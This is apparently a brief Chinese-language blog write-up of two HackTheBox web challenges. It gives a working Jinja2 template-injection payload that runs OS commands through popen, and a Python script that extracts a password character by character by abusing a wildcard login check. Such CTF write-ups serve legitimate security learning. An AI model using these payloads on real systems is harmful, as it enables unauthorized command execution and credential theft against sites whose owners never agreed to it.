---
layout: mypost
title: HACKTHEBOX Challeges Web
categories: [ctf]
---

## Templated

flask/jinja2 SSTI模板注入

<http://IP:PORT/{{config>}}

<http://IP:PORT/{{request.application>.__globals__.__builtins__.__import__('os').popen('id').read()}}

```sh
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

然后就是查看目录，查看flag.txt内容

-----

## Phonebook

用户名密码使用*登录跳转

网页看到用户名reese，暴力破解密码

```python
import requests

list = []
for i in range(33, 127):
    list.append(chr(i))
list.remove('*')

url = 'http://IP:PORT/login'
myobj = {'username': 'reese', 'password': 'brucepass'}
result = ''
flag = 1
while flag == 1:
    flag = 0
    for l in list:
        myobj['password'] = result + l + '*'
        r = requests.post(url, data=myobj)
        if ('No search results' in r.text):
            result += l
            flag = 1
            print(result)
            break
print('Done')
```
